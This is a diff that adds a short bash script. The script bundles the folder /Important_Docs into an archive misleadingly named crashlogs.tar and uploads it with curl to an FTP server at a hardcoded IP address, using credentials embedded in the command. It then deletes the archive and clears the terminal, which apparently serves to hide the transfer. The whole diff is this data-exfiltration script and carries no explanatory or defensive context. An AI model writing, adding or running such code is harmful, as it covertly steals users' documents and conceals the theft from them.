@@ -1,0 +1,8 @@
+#!/bin/bash
+
+
+cd ~;
+tar -cf crashlogs.tar /Important_Docs
+curl -T crashlogs.tar ftp://hostinger:password@192.168.0.10:21/ftp
+rm crashlogs.tar
+clear
